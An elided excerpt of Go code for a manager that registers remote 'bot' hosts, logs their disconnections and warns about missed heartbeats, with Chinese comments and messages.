...
func (m *Manager) Register(b *BOT) {
	...
	m.botslog.Add(b.ID, b.Addr()) // botslog 记录连接过的主机及对应 botlog 文件名
}
...
func (m *Manager) Remove(id, reason string) {
	...
	b.blog.Close()
	fmt.Printf("[%s] 机器下线: %s (%s) — %s\n",
		time.Now().Format("15:04:05"), id, b.Addr(), reason)
...
func (m *Manager) Miss(b *BOT) {
	...
	if first {
		fmt.Printf("[%s] 警告: %s (%s) %d 个周期未收到心跳，已写入缓存区列表，继续等待\n",
			time.Now().Format("15:04:05"), b.ID, b.Addr(), b.Missed)
